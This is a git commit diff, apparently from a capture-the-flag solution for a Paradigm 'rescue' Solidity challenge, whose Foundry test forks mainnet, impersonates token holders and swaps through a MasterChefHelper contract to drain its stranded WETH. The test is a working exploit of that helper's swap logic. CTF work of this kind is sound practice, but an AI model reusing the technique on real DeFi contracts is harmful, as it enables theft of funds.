36f0179e6d18fe6884e5468ada75553a04dd6c3a
Sara Reynolds <snreynolds2506@gmail.com>
2022-08-20 18:01:34 -0400

    apparently theres no fucking uni usdc pool

--- src/rescue/Setup.sol
+++ src/rescue/Setup.sol
@@ -3,31 +3,23 @@
 pragma solidity 0.8.16;
 
 import "./MasterChefHelper.sol";
-import "forge-std/console2.sol";
 
 interface WETH9 is ERC20Like {
     function deposit() external payable;
 }
 
 contract Setup {
-    
-    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    WETH9 public constant weth =
+        WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     MasterChefHelper public immutable mcHelper;
 
     constructor() payable {
         mcHelper = new MasterChefHelper();
         weth.deposit{value: 10 ether}();
         weth.transfer(address(mcHelper), 10 ether); // whoops
-        console2.log(weth.balanceOf(address(this)));
-        console2.log(weth.balanceOf(address(mcHelper)));
-    }
-
-    function getAddress() external returns (address) {
-      return address(mcHelper);
     }
 
     function isSolved() external view returns (bool) {
         return weth.balanceOf(address(mcHelper)) == 0;
     }
-
 }
--- src/rescue/tests/test.t.sol
+++ src/rescue/tests/test.t.sol
@@ -6,29 +6,41 @@ import {Setup} from "../Setup.sol";
 import {MasterChefHelper} from "../MasterChefHelper.sol";
 import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import "forge-std/console2.sol";
+import {UniswapV2RouterLike} from "../UniswapV2Like.sol";
 
 contract ContractTest is Test {
     Setup public s;
-    ERC20 uni;
 
-    MasterChefHelper ourHelper;
+    address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
+    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    address sushi = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
 
-    function setUp() public {
-    }
+    uint256 DAI_WETH_POOL = 2;
+
+    UniswapV2RouterLike router =
+        UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
+
+    MasterChefHelper mc;
+
+    function setUp() public {}
 
     function testRescueExploit() public {
-      vm.createSelectFork(vm.rpcUrl("paradigm"));
+        vm.createSelectFork(vm.rpcUrl("paradigm"));
+        s = new Setup{value: 10 ether}();
 
-      uni = ERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
-      vm.prank(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
-      uni.transfer(address(this), 1000 * 10**18);
-      s = new Setup{value: 10 ether}();
+        mc = s.mcHelper();
 
-      uni.approve(s.getAddress(), type(uint256).max);
-      // console2.log(uni.balanceOf(address(this)));
+        vm.prank(sushi);
+        ERC20(sushi).transfer(address(this), 100 * 10**18);
 
-      ourHelper = MasterChefHelper(s.getAddress());
+        vm.prank(dai);
+        ERC20(dai).transfer(address(mc), 100000 * 10**18);
 
-      ourHelper.swapTokenForPoolToken(1, address(uni), 1000 * 10**18, 0);
+        assertGt(ERC20(weth).balanceOf(address(mc)), 0);
+
+        ERC20(sushi).approve(address(mc), type(uint256).max);
+        mc.swapTokenForPoolToken(DAI_WETH_POOL, address(sushi), 10 * 10**18, 0);
+
+        assertEq(ERC20(weth).balanceOf(address(mc)), 0);
     }
 }
